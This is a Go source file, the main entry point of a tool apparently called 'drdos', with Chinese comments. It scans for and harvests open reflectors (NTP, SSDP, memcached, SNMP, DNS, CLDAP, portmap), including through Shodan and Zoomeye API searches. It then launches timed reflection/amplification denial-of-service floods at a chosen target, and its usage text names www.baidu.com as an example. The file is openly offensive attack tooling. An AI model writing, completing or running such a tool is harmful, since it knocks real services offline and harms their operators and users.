package main

import (
	"flag"
	"fmt"
	"net"
	"strings"

	"drdos/config"
	"drdos/core"
	"drdos/core/api"
	"drdos/plugins"
	"drdos/utils"
)

var typemap map[string]int

func init() {
	typemap = map[string]int{
		"ntp":       123,
		"ssdp":      1900,
		"memcached": 11211,
		"snmp":      161,
		"portmap":   111,
		"dns":       53,
		"cldap":     389,
	}
}

func modeWarn() {
	fmt.Println("[!] Mode must be set !")
	fmt.Println("[*] c		check ip mode")
	fmt.Println("[*] a		attack mode")
}

func usage() {
	fmt.Println(`[*] Check Mode:
	go run main.go -m c -f test.txt -o output.txt --type
[*] Atk	Mode:
	go run main.go -m a -f test.txt -t www.baidu.com -p 80 --type dns`)
}

// 支持域名，然后解析

func main() {
	var (
		mode       string // 模式选择，是IP筛选，还是攻击，还是筛选加攻击
		ipaddress  string // target ip
		srcaddress string // src ip
		port       int    // target port
		atktype    string // 攻击类型
		interval   uint   // 发包间隔
		loadfile   string // IP列表
		outputfile string // 输出的IP列表
		timeout    uint   // 攻击时间超时
		iprange    string // 手动输入的IP范围
		apiquery   bool   // api模式
	)

	flag.StringVar(&mode, "m", "", "c(check)|a(attack)|m(mix mode)")
	flag.StringVar(&ipaddress, "t", "", "Target ip")
	flag.StringVar(&srcaddress, "s", "", "Source ip (use internal ip if using ECS -- like aliyun)")
	flag.IntVar(&port, "p", 80, "Target port")
	flag.StringVar(&atktype, "type", "", "Attack type (ssdp|dns|ntp|snmp|portmap|mem|ldap)")
	flag.UintVar(&interval, "i", 10000, "Interval(0 for attack, 10000 for check, set it on config if using mix mode)")
	flag.StringVar(&loadfile, "f", "", "Vulnerable iplist path")
	flag.StringVar(&outputfile, "o", "", "Output file path")
	flag.UintVar(&timeout, "timeout", 120, "Attack time")
	flag.StringVar(&iprange, "range", "", "IP range")
	flag.BoolVar(&apiquery, "api", false, "Get IP list from api")
	flag.Parse()

	// 黑名单校验
	if utils.IsContain(plugins.Blacklist, ipaddress) {
		fmt.Println("[!] IP not allowed")
		return
	}
	// 参数校验
	// 设置mode
	switch mode {
	// 筛选IP模式

	/*
		2020-11-07
		check模式应该支持手工输入的单个IP或者一个range
	*/
	case "c":
		var iplist []string
		var err error
		fmt.Println("[+] Check Mode start")
		switch {
		// 1. 判断是否指定输出文件（Required）
		case outputfile == "":
			fmt.Println("[-] Please set -o option")
			usage()
			return
		// 2. 判断是否从文件输入
		case loadfile != "":
			fmt.Println("[+] Loadfile from " + loadfile)
			iplist, err = utils.FileLoads(loadfile)
			if err != nil {
				return
			}
		// 3. 判断是否从IP地址范围输入
		case iprange != "":
			if strings.Contains(iprange, "/") {
				iplist, err = utils.Hosts(iprange)
				if err != nil {
					fmt.Println("[-] wrong CIDR range!")
					return
				}
			} else {
				check := net.ParseIP(iprange)
				if check == nil {
					fmt.Println("[-] wrong IP address!")
					return
				}
				iplist = []string{iprange}
			}
		// 4. 判断是否从api输入
		case apiquery:
			switch {
			case config.ShodanApi != "":
				fmt.Println("[*] Shodan API Searching")
				for page := 1; page <= config.ShodanPage; page++ {
					tmplist, err := api.Shodan(typemap[atktype], uint(page))
					if err != nil {
						break
					}
					iplist = append(iplist, tmplist...)
				}
				fmt.Println("[+] Shodan API Searching Finished")
				fallthrough
			case config.ZoomeyeApi != "":
				fmt.Println("[*] Zoomeye API Searching")
				for page := 1; page <= config.ZoomeyePage; page++ {
					tmplist, err := api.Zoomeye(typemap[atktype], page)
					if err != nil {
						break
					}
					iplist = append(iplist, tmplist...)
				}
				fmt.Println("[+] Zoomeye API Searching Finished")
			}
			// 不同的搜索引擎可能会有重复的，这里做个去重操作
			iplist = utils.RemoveRepeatedElement(iplist)
		default:
			fmt.Println("[-] Error Input")
			return
		}

		_, err = core.Check(iplist, atktype, outputfile, interval, srcaddress)
		if err != nil {
			fmt.Println("[-] Check FAILED !")
		}

	// Attack模式
	case "a":
		fmt.Println("[+] Attack Mode")
		if ipaddress == "" || atktype == "" || loadfile == "" {
			fmt.Println("[-] Input error!")
			usage()
			return
		}
		if port > 65535 || port <= 0 {
			fmt.Println("[-] Port in range 1~65535")
			return
		}
		// [*] Attack模块内容
		fmt.Println("[+] Loadfile from " + loadfile)
		iplist, err := utils.FileLoads(loadfile)
		if err != nil {
			return
		}
		if interval == 10000 {
			interval = 0
		}
		err = core.Attack(iplist, ipaddress, atktype, port, interval, timeout)
		if err != nil {
			fmt.Println("[-] Attack Error")
			return
		}
	default:
		modeWarn()
	}
}
